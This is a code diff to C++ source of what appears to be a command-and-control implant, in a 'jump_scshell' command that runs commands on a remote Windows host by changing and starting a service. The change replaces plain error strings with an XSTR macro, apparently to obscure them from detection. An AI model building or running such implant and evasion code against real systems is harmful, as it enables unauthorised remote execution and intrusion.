@@ -28,7 +28,7 @@ auto declfn starburst::cmd_jump_scshell(
     auto host_str = parser_string( params, &host_len );
     if ( !host_str || host_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no hostname provided" ) ) );
+            XSTR( "no hostname provided" ) );
         return;
     }
 
@@ -39,7 +39,7 @@ auto declfn starburst::cmd_jump_scshell(
     auto command_str = parser_string( params, &command_len );
     if ( !command_str || command_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no command provided" ) ) );
+            XSTR( "no command provided" ) );
         return;
     }
 
@@ -47,7 +47,7 @@ auto declfn starburst::cmd_jump_scshell(
     HMODULE h_advapi = inst.kernel32.LoadLibraryA( _n );
     if ( !h_advapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load advapi32" ) ) );
+            XSTR( "failed to load advapi32" ) );
         return;
     }
 
@@ -73,7 +73,7 @@ auto declfn starburst::cmd_jump_scshell(
     if ( !pOpenSCManagerW || !pOpenServiceW || !pChangeServiceConfigW ||
          !pStartServiceW || !pQueryServiceConfigW || !pCloseServiceHandle ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to resolve SC APIs" ) ) );
+            XSTR( "failed to resolve SC APIs" ) );
         return;
     }
 
@@ -96,7 +96,7 @@ auto declfn starburst::cmd_jump_scshell(
         SC_MANAGER_CONNECT );
     if ( !h_scm ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "OpenSCManager failed" ) ) );
+            XSTR( "OpenSCManager failed" ) );
         return;
     }
 
@@ -105,7 +105,7 @@ auto declfn starburst::cmd_jump_scshell(
     if ( !h_svc ) {
         pCloseServiceHandle( h_scm );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "OpenService failed - service may not exist" ) ) );
+            XSTR( "OpenService failed - service may not exist" ) );
         return;
     }
 
@@ -142,7 +142,7 @@ auto declfn starburst::cmd_jump_scshell(
         pCloseServiceHandle( h_svc );
         pCloseServiceHandle( h_scm );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "ChangeServiceConfig failed" ) ) );
+            XSTR( "ChangeServiceConfig failed" ) );
         return;
     }
 
@@ -163,7 +163,7 @@ auto declfn starburst::cmd_jump_scshell(
     pCloseServiceHandle( h_scm );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-        symbol<char*>( const_cast<char*>( "command executed via service config modification" ) ) );
+        XSTR( "command executed via service config modification" ) );
 }
 
 #endif
